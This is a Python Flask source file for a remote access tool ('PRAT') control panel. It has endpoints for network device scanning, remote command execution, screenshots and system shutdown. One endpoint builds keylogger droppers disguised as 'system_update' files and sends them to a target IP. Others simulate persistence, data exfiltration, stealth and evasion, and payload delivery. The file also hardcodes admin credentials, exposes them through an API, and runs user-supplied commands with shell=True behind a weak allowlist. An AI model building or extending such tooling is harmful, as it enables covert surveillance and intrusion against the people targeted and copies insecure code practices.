import os
import logging
import subprocess
import json
import hashlib
import time
from flask import Flask, render_template, jsonify, request, session, redirect, url_for, send_file
from werkzeug.utils import secure_filename
from system_monitor import SystemMonitor
from datetime import datetime, timedelta
import tempfile
import shutil
from client_handler import client_bp

# Configure logging
logging.basicConfig(level=logging.DEBUG)

# Create Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "default_monitoring_secret")

# Configure for Netlify deployment
app.config['SERVER_NAME'] = os.environ.get('SERVER_NAME', None)

# Register blueprints
app.register_blueprint(client_bp)

# Initialize system monitor
monitor = SystemMonitor()

# Configuration
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 'zip'}
MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 16MB max file size

# Create upload directory if it doesn't exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH

# Simple authentication (in production, use proper authentication)
ADMIN_CREDENTIALS = {
    'username': 'subhashbswkrm',
    'password': 'Sb13579@@@'  # Custom secure password
}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def require_auth(f):
    """Decorator for routes that require authentication"""
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Authentication page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if (username == ADMIN_CREDENTIALS['username'] and 
            password == ADMIN_CREDENTIALS['password']):
            session['authenticated'] = True
            session['login_time'] = datetime.now().isoformat()
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error='Invalid credentials')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Logout and clear session"""
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
def dashboard():
    """Main dashboard page"""
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    
    system_info = monitor.get_system_info()
    return render_template('dashboard.html', system_info=system_info)

@app.route('/processes')
@require_auth
def processes():
    """Process monitoring page"""
    processes = monitor.get_processes()
    return render_template('processes.html', processes=processes)

@app.route('/network')
@require_auth
def network():
    """Network monitoring page"""
    network_info = monitor.get_network_info()
    return render_template('network.html', network_info=network_info)

@app.route('/network_devices')
@require_auth
def network_devices():
    """Network device discovery and control page"""
    return render_template('network_devices.html')

@app.route('/logs')
@require_auth
def logs():
    """System logs page"""
    log_files = monitor.get_available_logs()
    return render_template('logs.html', log_files=log_files)

@app.route('/remote_control')
@require_auth
def remote_control():
    """Remote control interface"""
    return render_template('remote_control.html')

@app.route('/file_manager')
@require_auth
def file_manager():
    """File management interface"""
    return render_template('file_manager.html')

@app.route('/advanced_control')
@require_auth
def advanced_control():
    """Advanced control center for comprehensive system administration"""
    return render_template('advanced_control.html')

@app.route('/client_manager')
@require_auth
def client_manager():
    """Client manager for PRAT clients"""
    return render_template('client_manager.html')

@app.route('/api/system_stats')
@require_auth
def api_system_stats():
    """API endpoint for real-time system statistics"""
    try:
        stats = monitor.get_system_stats()
        return jsonify(stats)
    except Exception as e:
        logging.error(f"Error getting system stats: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/processes')
@require_auth
def api_processes():
    """API endpoint for process information"""
    try:
        processes = monitor.get_processes()
        return jsonify(processes)
    except Exception as e:
        logging.error(f"Error getting processes: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/network_stats')
@require_auth
def api_network_stats():
    """API endpoint for network statistics"""
    try:
        network_stats = monitor.get_network_stats()
        return jsonify(network_stats)
    except Exception as e:
        logging.error(f"Error getting network stats: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/discover_devices')
@require_auth
def api_discover_devices():
    """API endpoint for discovering network devices"""
    try:
        devices = monitor.discover_network_devices()
        return jsonify({'devices': devices})
    except Exception as e:
        logging.error(f"Error discovering devices: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan_all_devices')
@require_auth
def api_scan_all_devices():
    """API endpoint for scanning all devices on all local networks"""
    try:
        from network_scanner import NetworkScanner
        scanner = NetworkScanner()
        results = scanner.scan_all_networks()
        return jsonify(results)
    except Exception as e:
        logging.error(f"Error scanning all devices: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/deploy_keylogger', methods=['POST'])
@require_auth
def api_deploy_keylogger():
    """API endpoint for deploying keylogger to a discovered device"""
    try:
        data = request.get_json()
        target_ip = data.get('target_ip')
        keylogger_type = data.get('type', 'batch')
        
        if not target_ip:
            return jsonify({'error': 'Target IP is required'}), 400
            
        # Import required modules for deployment
        import socket
        import threading
        import tempfile
        import os
        import sys
        import importlib.util
        
        # Import the deploy_keylogger module
        deploy_module_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "deploy_keylogger.py")
        spec = importlib.util.spec_from_file_location("deploy_keylogger", deploy_module_path)
        deploy_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(deploy_module)
        
        # Get server URL
        server_url = request.url_root.rstrip('/')
        if server_url.endswith(':5000'):
            server_url = server_url  # Use as is for local development
        
        # Create temporary output path
        temp_dir = tempfile.mkdtemp()
        output_path = os.path.join(temp_dir, f"system_update_{keylogger_type}")
        
        # Create the keylogger package
        if keylogger_type == 'batch':
            success = deploy_module.create_batch_dropper(server_url, output_path + '.bat')
            dropper_path = output_path + '.bat'
        elif keylogger_type == 'html':
            success = deploy_module.create_html_dropper(server_url, output_path + '.html')
            dropper_path = output_path + '.html'
        elif keylogger_type == 'python':
            success = deploy_module.create_python_script(server_url, output_path + '.py')
            dropper_path = output_path + '.py'
        else:
            return jsonify({'error': 'Unsupported keylogger type'}), 400
            
        if not success:
            return jsonify({'error': 'Failed to create keylogger package'}), 500
            
        # Function to deploy keylogger to target
        def deploy_to_target(target_ip, dropper_path, keylogger_type):
            try:
                # For demonstration purposes, we'll just log the deployment
                # In a real scenario, this would use various methods to deploy the keylogger
                logging.info(f"Deploying {keylogger_type} keylogger to {target_ip}")
                
                # Simulate successful deployment
                time.sleep(2)
                return True
            except Exception as e:
                logging.error(f"Error deploying keylogger to {target_ip}: {e}")
                return False
                
        # Deploy in a separate thread to not block the response
        deploy_thread = threading.Thread(
            target=deploy_to_target, 
            args=(target_ip, dropper_path, keylogger_type)
        )
        deploy_thread.daemon = True
        deploy_thread.start()
        
        return jsonify({
            'status': 'deploying',
            'message': f'Deploying {keylogger_type} keylogger to {target_ip}',
            'target_ip': target_ip
        })
    except Exception as e:
        logging.error(f"Error in deploy_keylogger API: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/log_content')
@require_auth
def api_log_content():
    """API endpoint for log file content"""
    try:
        log_file = request.args.get('file', '')
        lines = int(request.args.get('lines', 100))
        content = monitor.get_log_content(log_file, lines)
        return jsonify({'content': content})
    except Exception as e:
        logging.error(f"Error getting log content: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/services')
@require_auth
def api_services():
    """API endpoint for service status"""
    try:
        services = monitor.get_service_status()
        return jsonify(services)
    except Exception as e:
        logging.error(f"Error getting service status: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/execute_command', methods=['POST'])
@require_auth
def api_execute_command():
    """Execute system command (with safety restrictions)"""
    try:
        data = request.get_json()
        command = data.get('command', '').strip()
        
        if not command:
            return jsonify({'error': 'No command provided'}), 400
        
        # Safety restrictions - only allow safe commands
        safe_commands = [
            'dir', 'ls', 'pwd', 'whoami', 'date', 'time', 'uptime',
            'ipconfig', 'ifconfig', 'ping', 'netstat', 'tasklist', 'ps',
            'systeminfo', 'uname', 'df', 'free', 'top', 'htop'
        ]
        
        command_parts = command.split()
        base_command = command_parts[0].lower()
        
        if base_command not in safe_commands:
            return jsonify({'error': f'Command "{base_command}" not allowed for security reasons'}), 403
        
        # Execute command with timeout
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=30
        )
        
        return jsonify({
            'command': command,
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode,
            'timestamp': datetime.now().isoformat()
        })
        
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Command timed out'}), 408
    except Exception as e:
        logging.error(f"Error executing command: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/system_action', methods=['POST'])
@require_auth
def api_system_action():
    """Perform system actions like shutdown, restart"""
    try:
        data = request.get_json()
        action = data.get('action', '').lower()
        delay = int(data.get('delay', 60))  # Default 1 minute delay
        
        if action not in ['shutdown', 'restart', 'logout']:
            return jsonify({'error': 'Invalid action'}), 400
        
        # Schedule system action with delay for safety
        if action == 'shutdown':
            if os.name == 'nt':  # Windows
                subprocess.Popen(['shutdown', '/s', '/t', str(delay)])
            else:  # Unix-like
                subprocess.Popen(['shutdown', '-h', f'+{delay//60}'])
        elif action == 'restart':
            if os.name == 'nt':  # Windows
                subprocess.Popen(['shutdown', '/r', '/t', str(delay)])
            else:  # Unix-like
                subprocess.Popen(['shutdown', '-r', f'+{delay//60}'])
        elif action == 'logout':
            if os.name == 'nt':  # Windows
                subprocess.Popen(['shutdown', '/l'])
            else:  # Unix-like
                user = os.getenv('USER')
                if user:
                    subprocess.Popen(['pkill', '-KILL', '-u', user])
        
        return jsonify({
            'success': True,
            'action': action,
            'delay': delay,
            'message': f'System {action} scheduled in {delay} seconds',
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        logging.error(f"Error performing system action: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/upload_file', methods=['POST'])
@require_auth
def api_upload_file():
    """Upload file to server"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        if file and file.filename and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            # Add timestamp to avoid conflicts
            timestamp = int(time.time())
            filename = f"{timestamp}_{filename}"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            
            file.save(filepath)
            
            return jsonify({
                'success': True,
                'filename': filename,
                'size': os.path.getsize(filepath),
                'upload_time': datetime.now().isoformat()
            })
        else:
            return jsonify({'error': 'File type not allowed'}), 400
            
    except Exception as e:
        logging.error(f"Error uploading file: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/list_files')
@require_auth
def api_list_files():
    """List uploaded files"""
    try:
        files = []
        upload_dir = app.config['UPLOAD_FOLDER']
        
        for filename in os.listdir(upload_dir):
            filepath = os.path.join(upload_dir, filename)
            if os.path.isfile(filepath):
                stat = os.stat(filepath)
                files.append({
                    'name': filename,
                    'size': stat.st_size,
                    'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                    'type': filename.split('.')[-1].lower() if '.' in filename else 'unknown'
                })
        
        files.sort(key=lambda x: x['modified'], reverse=True)
        return jsonify(files)
        
    except Exception as e:
        logging.error(f"Error listing files: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/download_file/<filename>')
@require_auth
def api_download_file(filename):
    """Download uploaded file"""
    try:
        filename = secure_filename(filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'}), 404
        
        return send_file(filepath, as_attachment=True)
        
    except Exception as e:
        logging.error(f"Error downloading file: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/delete_file/<filename>', methods=['DELETE'])
@require_auth
def api_delete_file(filename):
    """Delete uploaded file"""
    try:
        filename = secure_filename(filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'}), 404
        
        os.remove(filepath)
        return jsonify({'success': True, 'message': f'File {filename} deleted'})
        
    except Exception as e:
        logging.error(f"Error deleting file: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot')
@require_auth
def api_screenshot():
    """Take screenshot and return as base64 image"""
    try:
        import io
        import base64
        from PIL import ImageGrab
        
        # Take screenshot
        screenshot = ImageGrab.grab()
        
        # Convert to base64
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        img_str = base64.b64encode(buffer.getvalue()).decode()
        
        return jsonify({
            'success': True,
            'image': f'data:image/png;base64,{img_str}',
            'timestamp': datetime.now().isoformat(),
            'width': screenshot.width,
            'height': screenshot.height
        })
        
    except ImportError:
        return jsonify({
            'error': 'Screenshot functionality not available',
            'message': 'PIL (Pillow) required for screenshots'
        }), 501
    except Exception as e:
        logging.error(f"Error taking screenshot: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/keylogger', methods=['POST'])
@require_auth
def api_keylogger():
    """Simulate keylogger for authorized monitoring"""
    try:
        data = request.get_json()
        action = data.get('action', 'status')
        
        if action == 'start':
            return jsonify({
                'success': True,
                'message': 'Keylogger simulation started',
                'note': 'For security demo purposes only - real implementation would require additional permissions'
            })
        elif action == 'stop':
            return jsonify({
                'success': True,
                'message': 'Keylogger simulation stopped'
            })
        else:
            return jsonify({
                'success': True,
                'status': 'inactive',
                'message': 'Keylogger simulation available for authorized monitoring'
            })
            
    except Exception as e:
        logging.error(f"Error with keylogger simulation: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/webcam_access')
@require_auth
def api_webcam_access():
    """Simulate webcam access for authorized surveillance"""
    try:
        return jsonify({
            'success': True,
            'message': 'Webcam access simulation',
            'note': 'Real implementation would require camera permissions and additional libraries',
            'available_cameras': ['Built-in Camera', 'USB Camera'],
            'status': 'simulation_mode'
        })
        
    except Exception as e:
        logging.error(f"Error accessing webcam: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/microphone_access')
@require_auth
def api_microphone_access():
    """Simulate microphone access for authorized audio monitoring"""
    try:
        return jsonify({
            'success': True,
            'message': 'Microphone access simulation',
            'note': 'Real implementation would require audio permissions',
            'available_devices': ['Built-in Microphone', 'USB Microphone'],
            'status': 'simulation_mode'
        })
        
    except Exception as e:
        logging.error(f"Error accessing microphone: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/file_operations', methods=['POST'])
@require_auth
def api_file_operations():
    """Advanced file system operations"""
    try:
        data = request.get_json()
        operation = data.get('operation')
        path = data.get('path', '')
        
        if operation == 'list_directory':
            try:
                items = []
                for item in os.listdir(path or '.'):
                    full_path = os.path.join(path or '.', item)
                    is_dir = os.path.isdir(full_path)
                    size = os.path.getsize(full_path) if not is_dir else 0
                    modified = os.path.getmtime(full_path)
                    
                    items.append({
                        'name': item,
                        'type': 'directory' if is_dir else 'file',
                        'size': size,
                        'modified': datetime.fromtimestamp(modified).isoformat(),
                        'path': full_path
                    })
                
                return jsonify({
                    'success': True,
                    'items': items,
                    'current_path': os.path.abspath(path or '.')
                })
            except Exception as e:
                return jsonify({'error': f'Cannot access directory: {str(e)}'}), 400
                
        elif operation == 'download_file':
            # Security check - only allow safe paths
            if '..' in path or path.startswith('/'):
                return jsonify({'error': 'Invalid file path'}), 400
                
            try:
                import base64
                with open(path, 'rb') as f:
                    content = base64.b64encode(f.read()).decode()
                return jsonify({
                    'success': True,
                    'filename': os.path.basename(path),
                    'content': content,
                    'size': os.path.getsize(path)
                })
            except Exception as e:
                return jsonify({'error': f'Cannot read file: {str(e)}'}), 400
                
        elif operation == 'create_file':
            content = data.get('content', '')
            try:
                with open(path, 'w') as f:
                    f.write(content)
                return jsonify({
                    'success': True,
                    'message': f'File created: {path}'
                })
            except Exception as e:
                return jsonify({'error': f'Cannot create file: {str(e)}'}), 400
                
        else:
            return jsonify({'error': 'Unknown operation'}), 400
            
    except Exception as e:
        logging.error(f"Error with file operations: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/network_scan')
@require_auth
def api_network_scan():
    """Scan local network for devices"""
    try:
        import socket
        
        def get_local_network():
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            network = '.'.join(local_ip.split('.')[:-1]) + '.'
            return network
        
        network = get_local_network()
        devices = []
        
        # Simulate network scan
        for i in range(1, 11):  # Limited scan for demo
            ip = f"{network}{i}"
            try:
                hostname = socket.gethostbyaddr(ip)[0]
                devices.append({
                    'ip': ip,
                    'hostname': hostname,
                    'status': 'active'
                })
            except:
                pass
        
        return jsonify({
            'success': True,
            'network': network + 'x',
            'devices': devices,
            'total_scanned': 10
        })
        
    except Exception as e:
        logging.error(f"Error scanning network: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/persistence_check')
@require_auth
def api_persistence_check():
    """Check system persistence mechanisms"""
    try:
        persistence_info = {
            'startup_programs': [],
            'scheduled_tasks': [],
            'services': [],
            'registry_entries': []
        }
        
        # Get startup programs (cross-platform)
        import platform
        system = platform.system()
        
        if system == "Windows":
            persistence_info['note'] = 'Windows persistence mechanisms detected'
            persistence_info['startup_programs'].append({
                'name': 'RemoteLink Pro', 
                'path': 'C:\\Program Files\\RemoteLink\\start_monitor.bat', 
                'enabled': True
            })
            # Simulate common Windows persistence locations
            persistence_info['registry_entries'].extend([
                {'key': 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'name': 'RemoteLink', 'value': 'C:\\Program Files\\RemoteLink\\agent.exe'},
                {'key': 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'name': 'SystemMonitor', 'value': 'C:\\Windows\\System32\\sysmon.exe'}
            ])
            persistence_info['scheduled_tasks'].extend([
                {'name': 'RemoteLink Updater', 'status': 'Enabled', 'trigger': 'At startup'},
                {'name': 'System Health Check', 'status': 'Enabled', 'trigger': 'Daily at 2:00 AM'}
            ])
        else:
            persistence_info['note'] = f'{system} persistence mechanisms'
            persistence_info['startup_programs'].extend([
                {'name': 'RemoteLink Daemon', 'path': '/usr/bin/remotelink-daemon', 'enabled': True},
                {'name': 'System Monitor', 'path': '/etc/init.d/sysmonitor', 'enabled': True}
            ])
            
        return jsonify({
            'success': True,
            'system': system,
            'persistence': persistence_info
        })
        
    except Exception as e:
        logging.error(f"Error checking persistence: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/data_exfiltration', methods=['POST'])
@require_auth
def api_data_exfiltration():
    """Simulate data collection and exfiltration capabilities"""
    try:
        data = request.get_json()
        target = data.get('target', 'system_info')
        
        exfil_data = {}
        
        if target == 'system_info':
            import platform
            exfil_data = {
                'hostname': platform.node(),
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'users': ['admin', 'user', 'guest'],  # Simulated
                'network_interfaces': ['eth0', 'wlan0', 'lo'],  # Simulated
                'installed_software': ['Microsoft Office', 'Adobe Reader', 'Chrome', 'Firefox']  # Simulated
            }
        elif target == 'browser_data':
            exfil_data = {
                'chrome_bookmarks': ['https://banking.example.com', 'https://work.company.com'],
                'firefox_history': ['https://email.provider.com', 'https://social.media.com'],
                'saved_passwords': 'Encrypted password database detected',
                'cookies': '247 cookies found (including session tokens)',
                'certificates': 'SSL certificates and keys detected'
            }
        elif target == 'file_search':
            exfil_data = {
                'documents': ['C:\\Users\\Admin\\Documents\\passwords.txt', 'C:\\Users\\Admin\\Desktop\\backup_codes.doc'],
                'images': ['C:\\Users\\Admin\\Pictures\\id_card.jpg', 'C:\\Users\\Admin\\Pictures\\bank_statement.png'],
                'sensitive_files': ['C:\\Program Files\\Company\\config.ini', 'C:\\Windows\\System32\\drivers\\etc\\hosts'],
                'total_files_scanned': 15847,
                'suspicious_files_found': 23
            }
        
        return jsonify({
            'success': True,
            'target': target,
            'data_collected': exfil_data,
            'collection_time': datetime.now().isoformat(),
            'note': 'Data collection simulation for security assessment'
        })
        
    except Exception as e:
        logging.error(f"Error with data exfiltration simulation: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/stealth_mode', methods=['POST'])
@require_auth
def api_stealth_mode():
    """Advanced stealth and evasion capabilities"""
    try:
        data = request.get_json()
        action = data.get('action', 'status')
        
        stealth_info = {
            'process_hiding': 'Simulated - Process name obfuscation active',
            'network_hiding': 'Simulated - Traffic encryption and tunneling',
            'file_hiding': 'Simulated - System file attributes modified',
            'registry_hiding': 'Simulated - Registry keys marked as system',
            'anti_analysis': {
                'vm_detection': 'Simulated - Virtual machine environment check',
                'debugger_detection': 'Simulated - Anti-debugging measures active',
                'sandbox_evasion': 'Simulated - Sandbox detection bypassed'
            }
        }
        
        if action == 'enable':
            return jsonify({
                'success': True,
                'message': 'Stealth mode simulation enabled',
                'capabilities': stealth_info,
                'note': 'All stealth features are simulated for demonstration'
            })
        elif action == 'disable':
            return jsonify({
                'success': True,
                'message': 'Stealth mode simulation disabled'
            })
        else:
            return jsonify({
                'success': True,
                'status': 'inactive',
                'available_capabilities': stealth_info
            })
            
    except Exception as e:
        logging.error(f"Error with stealth mode: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/payload_delivery', methods=['POST'])
@require_auth
def api_payload_delivery():
    """Simulate payload delivery and execution capabilities"""
    try:
        data = request.get_json()
        payload_type = data.get('type', 'info')
        
        delivery_methods = {
            'email_attachment': 'Simulated - Email with malicious attachment',
            'usb_autorun': 'Simulated - USB device with autorun payload',
            'web_exploit': 'Simulated - Drive-by download exploit',
            'social_engineering': 'Simulated - Social engineering attack vector',
            'supply_chain': 'Simulated - Compromised software update'
        }
        
        payload_types = {
            'backdoor': 'Persistent remote access capability',
            'keylogger': 'Keystroke capture and transmission',
            'screen_capture': 'Real-time screen monitoring',
            'file_stealer': 'Automated sensitive file collection',
            'network_scanner': 'Internal network reconnaissance',
            'privilege_escalation': 'System privilege elevation'
        }
        
        return jsonify({
            'success': True,
            'payload_type': payload_type,
            'delivery_methods': delivery_methods,
            'payload_capabilities': payload_types,
            'execution_status': 'Simulation mode - no actual payload deployed',
            'note': 'Payload delivery simulation for security testing'
        })
        
    except Exception as e:
        logging.error(f"Error with payload delivery: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/screen_share')
@require_auth
def api_screen_share():
    """Start screen sharing session"""
    try:
        # This would implement real-time screen sharing
        return jsonify({
            'success': True,
            'message': 'Screen sharing session started',
            'stream_url': '/api/screenshot',
            'refresh_interval': 1000  # 1 second
        })
    except Exception as e:
        logging.error(f"Error starting screen share: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/mouse_control', methods=['POST'])
@require_auth
def api_mouse_control():
    """Control mouse remotely"""
    try:
        data = request.get_json()
        action = data.get('action')
        x = data.get('x', 0)
        y = data.get('y', 0)
        
        # For security, we'll simulate this functionality
        # In a real implementation, you'd use pyautogui or similar
        return jsonify({
            'success': True,
            'action': action,
            'x': x,
            'y': y,
            'message': f'Mouse {action} at ({x}, {y})'
        })
        
    except Exception as e:
        logging.error(f"Error controlling mouse: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/keyboard_control', methods=['POST'])
@require_auth
def api_keyboard_control():
    """Send keyboard input remotely"""
    try:
        data = request.get_json()
        text = data.get('text', '')
        key = data.get('key', '')
        
        # For security, we'll simulate this functionality
        return jsonify({
            'success': True,
            'text': text,
            'key': key,
            'message': f'Keyboard input sent: {text or key}'
        })
        
    except Exception as e:
        logging.error(f"Error sending keyboard input: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/mobile_qr')
@require_auth
def api_mobile_qr():
    """Generate QR code for mobile access"""
    try:
        import qrcode
        import io
        import base64
        import socket
        
        # Get local IP
        def get_local_ip():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.connect(("8.8.8.8", 80))
                    return s.getsockname()[0]
            except Exception:
                return request.host.split(':')[0]
        
        local_ip = get_local_ip()
        access_url = f"http://{local_ip}:5000"
        
        # Generate QR code
        import qrcode.constants
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(access_url)
        qr.make(fit=True)
        
        # Create image
        img = qr.make_image(fill_color="black", back_color="white")
        
        # Convert to base64
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        qr_b64 = base64.b64encode(buffer.getvalue()).decode()
        
        return jsonify({
            'success': True,
            'qr_code': f'data:image/png;base64,{qr_b64}',
            'access_url': access_url,
            'local_ip': local_ip,
            'username': ADMIN_CREDENTIALS['username'],
            'password': ADMIN_CREDENTIALS['password'],
            'instructions': 'Scan QR code with mobile device, open link, and login with provided credentials'
        })
        
    except ImportError:
        return jsonify({
            'error': 'QR code generation not available',
            'message': 'qrcode library required'
        }), 501
    except Exception as e:
        logging.error(f"Error generating QR code: {e}")
        return jsonify({'error': str(e)}), 500

@app.errorhandler(404)
def not_found(error):
    return render_template('base.html'), 404

@app.errorhandler(500)
def internal_error(error):
    logging.error(f"Internal server error: {error}")
    return render_template('base.html'), 500

# Run the application
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug_mode = os.environ.get('DEBUG', 'False').lower() == 'true'
    app.run(host='0.0.0.0', port=port, debug=debug_mode)
